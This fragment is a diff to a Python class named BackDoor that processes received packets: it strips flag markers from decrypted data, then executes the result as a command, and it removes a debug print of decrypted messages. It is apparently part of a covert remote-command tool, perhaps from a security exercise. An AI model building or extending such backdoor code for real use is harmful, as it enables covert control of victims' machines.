@@ -246,8 +246,9 @@ class BackDoor:
             return
 
     def process_packet(self, data):
-        print(f"Executing: {data}")
-        self.execute(data)
+        stripped_msg = data.strip(self.flag_begin).rstrip(self.flag_close)
+        print(f"Executing: {stripped_msg}")
+        self.execute(stripped_msg)
 
     def set_client(self, ip):
         print(f"Setting client ip as {ip}")
@@ -264,7 +265,6 @@ class BackDoor:
         padded_message = decryptor.update(encrypted_byte_stream) + decryptor.finalize()
         msg = unpadder.update(padded_message) + unpadder.finalize()
         msg = msg.decode()
-        print(f"Decrypted message: {msg}")
         return msg
 
     def encrypt_data(self, cipher, line) -> bytes:
